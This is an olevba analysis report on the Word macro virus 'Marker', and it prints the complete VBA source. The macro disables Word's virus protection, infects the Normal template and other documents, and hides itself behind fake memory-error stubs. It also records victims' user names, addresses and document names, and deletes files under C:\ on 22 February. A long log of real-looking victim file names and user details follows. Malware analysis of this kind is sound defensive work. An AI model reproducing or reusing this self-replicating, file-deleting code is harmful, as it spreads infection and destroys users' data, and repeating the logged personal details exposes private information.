olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-f79db0df6380c37adaae83fba5451b4feb906b35
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-f79db0df6380c37adaae83fba5451b4feb906b35 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Private Sub Document_Close()
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
On Error Resume Next
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim ad, nt As Object
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim rep, x As Integer
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim virusCode, UserAddress, LogData, LogFile As String
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Options.VirusProtection = False
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Options.SaveNormalPrompt = True
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Delivery:
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If Day(Now()) = 22 And Month(Now()) = 2 Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Kill "C:\*.*":
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
GoTo Delivery
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If DocumentInfected = True Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
SaveNormalTemplate = NormalTemplate.Saved
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
For i = 1 To Len(Application.UserAddress)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Else
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
UserAddress = UserAddress & Chr(13) & "' "
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Next i
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
virusCode = virusCode & LogData
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.AddFromString virusCode
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
With nt.codemodule
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End With
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
With nt.codemodule
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
For x = 45 To 181 Step 2
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Next x
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End With
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If SaveNormalTemplate = True Then NormalTemplate.Save
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If NormalTemplateInfected = True Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
SaveDocument = ActiveDocument.Saved
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
ad.codemodule.AddFromString virusCode
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.AddFromString virusCode
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
ad.codemodule.Deletelines 174, 13
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
With ad.codemodule
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
For x = 45 To 181 Step 2
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Next x
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End With
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If SaveDocument = True Then ActiveDocument.Save
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Options.SaveNormalPrompt = False
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End Sub
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
' Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
' Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
' Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:

' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' HOTLIST1.doc

' Toshinobu SHIIKI.doc

' Jacob Jacobs.doc

' cv_focus.doc

' letter2.doc

' Hot List 05-27-1999.doc

' Ashwat.doc

' dbaunix.doc

' juno.doc

' CVMBA.doc

' RESUME399.doc

' Alex Lam.doc

' Senior Unix Administrator.doc

' Senior Unix Administrator.doc

' RESUME LATEST11.doc

' Ryuji Iwamoto1.doc

' Document1

' Sivaram Venkata1.doc

' Dean's Resume Current.doc

' infrmgr.doc

' Alan LEE.doc

' Jackson YAU.doc

' Patrickshum.doc

' Resume.doc

' CurrVit (1).doc

' SaleTar.doc

' Gerald Sanderson.doc

' Lee-A.doc

' carmel~1.doc

' 990116.res-detail-ltt.doc

' resume.doc

' Ad tech supp.doc

' Interview Discussion Items.doc

' Rres97j.doc

' Cvrltra.doc

' HOTLIST1.doc

' Mar-W.doc

' thomas chu.doc

' 09:17:55 AM -Monday,21 Jun,1999
' hunga
'
' Thomas Chu.doc

' PC Asset Change Form Proliant 5000.doc

' fax.template2.doc

' EAS Fax 19990622.doc

' ~0040067.doc

' ~0002553.doc

' 19990609summary.doc

' 04:05:14 PM -Friday,16 Jul,1999
' chanjim
'
' 19990702summary.doc

' Doc1.doc

' Document1

' Document1

' offsite1.doc

' offsite2.doc

' Cover Letter for your Resume.doc

' ~0058164.doc

' Document1

' Doc1.doc

' Document2

' Document3

' Fax.doc

' 03:31:57 PM -Friday,23 Jul,1999
' leed
'
' Fax.doc

' RES0699b.doc

' Document1

' KTB.doc

' KTB.doc

' Ww260799.doc

' Ww260799.doc

' wwh260799.doc

' wwh260799.doc

' wwh260799.doc

' Document1

' Document1

' offsite1.doc

' th0727a.doc

' corp-chart.doc

' RES0699b.doc

' BIRTHDAY.DOC

' th0729adoc.doc

' th0729adoc.doc

' 03:13:09 PM -Thursday,29 Jul,1999
' andrewti
'
' ~0061018.doc

' Exit Strategy .doc

' Document1

' Morning meeting roster.doc

' Meralco.doc

' GAS_Bst0799.doc

' Response to Mark Ogle.doc

' Doc11_.doc

' ~0025144.doc

' bt9flyer.doc

' A crocodile cannot stick its tongue out.doc

' Document1

' gas0899.doc

' smtm.....doc

' foster.doc

' Final meeting follow up memo.doc

' Document3

' frontpage.doc

' 09:52:49 AM -Tuesday,3 Aug,1999
' manc
'
' Fronttext.doc

' Elmu_Text.doc

' Aug99.doc

' 04:21:03 PM -Tuesday,3 Aug,1999
' lisaw
'
' AUG99.DOC

' Utilitiesfinal.doc

' SthAfricafinal.doc

' GAS9908.DOC

' 03:16:20 PM -Friday,6 Aug,1999
' East
'
' Gas9908.doc

' StratAsia-Aug99-report.doc

' 11:39:18 AM -Saturday,7 Aug,1999
' XPRESS PRINT
'
' StratAsia-Aug99-report.doc

' Document1

' hk2004-2.doc

' 06:41:32 PM -Friday,13 Aug,1999
' Xpress Print Pte Ltd
'
' hk2004-2.doc

' Document1

' 9907381(appen2).doc

' new2(13Aug).doc

' App5.doc

' 09:36:50 AM -Wednesday,18 Aug,1999
' xpress
'
' App5new4(18Aug_am).doc

' CCZ.doc

' MEMORANDUM for flashing of access card.doc

' STB.doc

' 08:57:52 AM -Monday,23 Aug,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' STB.doc

' Press Release.doc

' Document1

' Despatch form.doc

' invitation.doc

' swensen-suntec invite - 13 Aug 1999.doc

' GulPR.doc

' fax-cover.doc

' Document3

' Quotation Requisition Form_.doc

' Quotation Requisition.doc

' Gul Tech-MediaList.doc

' fax-cover.doc

' ProdVPE.doc

' CorpVPE.doc

' mediafax.doc

' Nobel-Media List (Aug 19'99).doc

' Nobel-Media List (Aug 19'99).doc

' fax-cover.doc

' Document5

' billingadvice.doc

' fax-cover.doc

' NobelPR.doc

' Nobel-PR (Aug 23'99).doc

' newslettersPE.doc

' Delivery Order.doc

' fax-cover.doc

' logoPE.doc

' posterPE.doc

' badgesPE.doc

' videoPE.doc

' fax-cover.doc

' fax-cover.doc

' News Clippings.doc

' timesheet.doc

' CSA-Schroders.doc

' Arthur Andersen - Project (Aug 25 '99).doc

' Johnson & Johnson - Event Mgmt- CSA (Sept 4).doc

' fax-cover.doc

' IT Request Form.doc

' Shirley-2.doc

' Document1

' Prod.Estimate.doc

' September.doc

' fax-Joachim.doc

' fax-cover.doc

' timesheet.doc

' fax-cover-JL.doc

' Gul-AnalystInvite (Aug 27'99).doc

' Gul-PressInvite (Aug 27'99).doc

' Gul-AnalystInvite (Aug 27'99).doc

' Gul-AnalystInvite.doc

' Hotel's Contact.doc

' Gul-PressInvite (Aug 27'99).doc

' Sponsorship for Suntec City.doc

' fax-cover-JL.doc

' timesheet.doc

' fax-cover-JL.doc

' fax-cover-JL.doc

' fax-cover-JL.doc

' solar eclipse.doc

' GulTech-MediaAttend (Aug 30'99).doc

' August.doc

' fax-cover-JL.doc

' GulTech-AnalystAttend (Aug 30'99).doc

' GulTech-MediaAttend2 (Aug 30'99).doc

' fax-cover-JL.doc

' fax-JC2.doc

' fax-cover-JL.doc

' FJ1.doc

' Security Houses List(Sept 3'99).doc

' e-mooncake -Media List (Aug 7'99).doc

' mediafax.doc

' Press invite (Sept 3).doc

' Document2

' i-One write-up.doc

' psb.pr.amend.doc

' psb - PR (Sept 2'99).doc

' Document2

' Document3

' Internal Memo.doc

' Press Attend (Sept 3'99).doc

' psb - PR (Sept 3'99).doc

' proposal-1.doc

' Budget emooncake(Sept 3'99).doc

' 02:48:25 PM -Saturday,4 Sep,1999
' cd
' Stratagem Consultants
' Communications Techno Centre
' 1 Kallang Way 2A
' Singapore 347495
' Budget emooncake(Aug 11'99).doc

' Chinois invite card text.doc

' prog-Ngee Ann Swensens.doc

' TCS-Oct 16.doc

' InternalMinutesSEP06.doc

' September.doc

' BOOTH DATA.doc

' Money World Asia poster.doc

' techno1.sub.doc

' oracle statement.doc

' timetable.doc

' Chinois Programme.doc

' NRIC Form.doc

' EPPU HEAD REFERENCES.doc

' checklist-Chinois 26 Sept.doc

' GITIS FAQs.doc

' GITIS FORM.doc

' GITIS.doc

' budget2.doc

' InternalMinutesSEP10.doc

' checklist BCA.doc

' September.doc

' STRATAGEM-CREDENTIAL.doc

' ABR minutes.doc

' Document1

' 16 Sept - Min.doc

' Document1

' Chinois i-one-food release.doc

' 02:00:55 PM -Saturday,25 Sep,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' Chinois i-one-food release.doc

' DesignerAllocation_990909b.doc

' I-One Kiosk - Schedule of Activities.doc

' Suntec_990914directory.doc

' Food_photo990923.doc

' TP_Schedule of Activities_990927.doc

' Zhi Hong.doc

' Ecommerce_JCF.doc

' e-commerce_JCF_990915.doc

' Document1

' Yi Leng electronics2.doc

' new_JCF2.doc

' JV Goldsmith.doc

' 03:15:24 PM -Thursday,30 Sep,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' JV Goldsmith.doc

' Joy Doggy.doc

' hay's.doc

' Beauty Glow Dermal.doc

' Beauty Glow Dermal.doc

' Joy Doggy Pet Shop.doc

' anak.doc

' 02:59:49 PM -Friday,8 Oct,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' anak.doc

' JTC script1.doc

' amconics.doc

' Backup of One Stop Beauty.wbk

' beauty asia2.doc

' Bodhicherie Vegetarian.doc

' First Love.doc

' Joy Doggy.doc

' Le Style Home.doc

' prindeli confectionery.doc

' The Face Concept.doc

' Document1.doc

' Document2.doc

' Document1.doc

' Document1

' video.doc

' NTUCscript.doc

' video.doc

' JTC script1.doc

' Orchid Country Club.doc

' JTC script1.doc

' jOB Status.doc

' JTC script1.doc

' job status.doc

' job status.doc

' video.doc

' Document1

' Document2.doc

' NTUCscript.doc

' NTUCscript.doc

' 06:02:13 PM -Friday,15 Oct,1999
' zhouqin
'
' NTUCscript1.doc

' English script.doc

' new teleskill all.doc

' HQ_MM.doc

' future_MM.doc

' 09:27:22 下蝸E-星期一,18 十月,1999
' mm_user
'
' future_MM.doc

' Delco Scripts.doc

' name card.doc

' pg1_ningqiaoli.doc

' 02:28:40 PM -Tuesday,19 Oct,1999
' Alex Tham
' CNNHS B'92 PHILIPPINES (CNSC)
' pg1_ningqiaoli.doc

' Document1

' 1013_SSIS.doc

' Document2

' 1008_CSSD_CD.doc

' 1003_CSSD.doc

' 1002_CSSD.doc

' Benifit.doc

' STRIKE ACCOUNTS.doc

' pg1_zhouqin.doc

' Zhuqinhua.doc

' Document1

' Suzhou Letter of Acceptance Cover Ltr(new).doc

' progress report on HK & Suzhou offices.doc

' confirm_alex.doc

' Reference Book.doc

' PR_ISDN.doc

' 02:48:32 PM -Tuesday,26 Oct,1999
' xpress_sz
'
' PR_ISDN.doc

' Issue Chq_5.doc

' Karyn.doc

' Photocopy&C_Printer.doc

' Contribution to XMS.doc

' Profit Centre proposal.doc

' Sheraton - Frank Fan.doc

' Issue Chq_4.doc

' Meeting with Spore Consult.doc

' Grundfos.doc

' POSB.doc

' Hi everybody at home.doc

' Internet Bar info.doc

' conference chair.doc

' Grundfos_2.doc

' Release Letter.doc

' Joseph_STB.doc

' Erik Wang-TDBShanghai.doc

' wuyanlong.doc

' Bob.doc

' room.doc

' Sheraton - Sam Chen.doc

' Yen.doc

' lh.doc

' Air Cond maintenance.doc

' CaiJiXian.doc

' newpaper cutting.doc

' Logic.doc

' Int School.doc

' Memo.doc

' Kum Thye.doc

' 2610_2.doc

' newstaffe.doc

' 19981.doc

' Xu Wei.doc

' tiaoxin.doc

' maket.doc

' Document3

' staff list.doc

' CD.doc

' newstaffe.doc

' aa.doc

' work2.xls

' multimedia.doc

' Address.doc

' renewal.doc

' maket_1.doc

' Video.doc

' TV Set.doc

' XMSZ_maket.doc

' 01.doc

' Busway_text_c.doc

' 0211_caijixian.doc

' Doc1.doc

' Multimedia - Addition.doc

' Chartered Asset Management.doc

' Ci Min Beauty Workshop.doc

' Cyber Dome Internet Cafe.doc

' Chuan Cheong Building & Construction.doc

' Facial Art de Beauty.doc

' JV Goldsmith & jewellery.doc

' Doc1.doc

' Telephone.doc

' 10.doc

' disclaimer.doc

' ying.xls

' 1998.doc

' 1.doc

' Book1.xls

' ren.doc

' Dephi.doc

' CP.doc

' LSB.doc

' PJH.doc

' CZY.doc

' Document1

' English script.doc

' 4050A.doc

' yuhuayuan.doc

' 1965.doc

' Advances.doc

' Garden Plaza.doc

' 09:52:51 AM -Friday,19 Nov,1999
' Lim
'
' Garden Plaza_E.doc

' 文档1

' 关于人力资源管历潸佝营蟻Edoc

' 润发公寓预算方案.doc

' 上周工作报告（11。8~12）.doc

' 辞职蓙E丒丒doc

' 辞职蕘Edoc

' 售后服务记录.doc

' 考勤说脕E.doc

' 人事说脕E.doc

' 考勤说脕E.doc

' 仓库工作流程.doc

' REVIEW.DOC

' 工资说脕E.doc

' 文档1

' 上周工作报告（11.15~11.19）.doc

' 文档1

' 人事.doc

' 19991117.doc

' 单个模縼Edoc

' 公司简介E.doc

' Contract.doc

' file002 (4).DOC

' 周界报警器材.doc

' HuPrice.doc

' 产品装箱单.doc

' 使用鳃佝.doc

' Gaoda Co. Ltd.doc

' 上周技术开发情况汇报.doc

' construct (1).doc

' account.doc

' Week Plan.doc

' Humen Resource.doc

' 贵夫人.DOC

' 工艺文~1.DOC

' Check and Accept.doc

' 工艺单~1.DOC

' gz1.doc

' 贵妇人~2.DOC

' 贵夫人~1.DOC

' 贵妇人~1.DOC

' 贵妇人~3.DOC

' 贵妇人~4.DOC

' 贵妇人~5.DOC

' 贵妇人.DOC

' 文档2

' 文档1

' file002 (4).DOC

' file003.DOC

' file002 (4).DOC

' file002 (4).DOC

' file002.DOC

' file002 (5).DOC

' file002 (5).DOC

' file002 (5).DOC

' file003 (1).DOC

' 工艺技~2.DOC

' 工艺技~1.DOC

' 工艺文~1.DOC

' 工艺文~2.DOC

' 工艺文档.DOC

' CRT考勤仪通讯协襾Edoc

' 富士通消嗫报竵Edoc

' 600巇條4.doc

' file002 (6).DOC

' file002 (7).DOC

' file002 (7).DOC

' file002 (7).DOC

' file004.DOC

' file003 (3).DOC

' file002 (7).DOC

' file002.DOC

' file002 (8).DOC

' 考勤说脕E.doc

' file003.DOC

' file004.DOC

' file_ (1).doc

' file_ (1).doc

' 文档bak.doc

' to Mr. Zhu.doc

' fax.doc

' Archive.doc

' Product3.doc

' 移交报竵Edoc

' 工程安装协襾Edoc

' 工程合同.doc

' 决算眮Edoc

' 系统工程消嗫.doc

' 周界报警器材.doc

' 关于PTD的补充协襾Edoc

' 第三代保安电子巡竵E低矴S1000.doc

' XIEYI.doc

' 工程合同1.doc

' donwu.doc

' XIEYI（DW）.doc

' 吴县市东吴花园.doc

' 东吴花园周界报警.doc

' 东吴花园方案.doc

' 总詠E?doc

' 润发方案1.doc

' 产品报价单.doc

' 功能比较、分蝸Edoc

' 公司以往消嗫简絹Edoc

' 函竵Edoc

' ygy.doc

' 交验单.doc

' 佳安函竵Edoc

' 滨河花园方案.doc

' 东吴合同.doc

' 苏州新馨置地有限公司（gx）.doc

' 馨都二期方案.doc

' 三星苑住宅小区安全技术防范方案.doc

' 樱缘方案.doc

' 东吴方案（含合同）.doc

' 嘉怡苑2.doc

' 三星苑住宅小区安全技术防范方案.doc

' Joe Lee.doc

' TY ECU愝掕婍僥僗僩巇條彂.doc

' TY ECU愝掕婍僥僗僩巇條彂.doc

' Joe Lee.doc

' Joe Lee.doc

' file_ (1).doc

' file.doc

' 文档1

' EResume.doc

' CResume.doc

' readme.doc

' Sample.doc

' Contract1.DOC

' 向隆塑胶预算方案.doc

' 市区address.doc

' 协  襾E 书（欧莱雅）.doc

' 安德鲁电信.doc

' 百得合同.doc

' 本周计划.doc

' 新产品报价单.doc

' 合作框架协襾Edoc

' Product1_0.doc

' 199922.doc

' 常蕘Eddress.doc

' 威尼斯方案.doc

' Sample.doc

' Contract1.DOC

' Throwaway.doc

' Price.doc

' Contract for Service.doc

' Contract2.DOC

' Database8.doc

' Tables.DOC

' 封脕Edoc

' 文档.doc

' 高磥E��?doc

' 面试考虂Edoc

' 人力资源.doc

' 封脕Edoc

' 封脕E.doc

' 人力资源封脕E.doc

' O1.doc

' Company1.doc

' Product.doc

' Product1.DOC

' Product1.doc

' Product1_0.doc

' Packaging1.doc

' Advert1.doc

' IT.doc

' 考勤系统简絹Edoc

' 公司介绍.doc

' 公 司 絹E绍1.doc

' 高磥E记诩�成系�?doc

' Test.doc

' Task.doc

' Rlzyxsjh.doc

' 03:25:32 屵屻 -Sunday,13 Feb,2000
' Wuxb
'
' Rlzyxsjh.doc

' Price.doc

' xsjh.doc

' 俻倀俙俢楢棈彂0213.doc

' 俻倀俙俢楢棈彂0213.doc

' 俻倀俙俢楢棈彂0213.doc

' 俻倀俙俢楢棈彂0213.doc

' 09:36:47 PM -Sunday,13 Feb,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' VIRUS1.DOC

' Doc3.doc

' Doc2.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

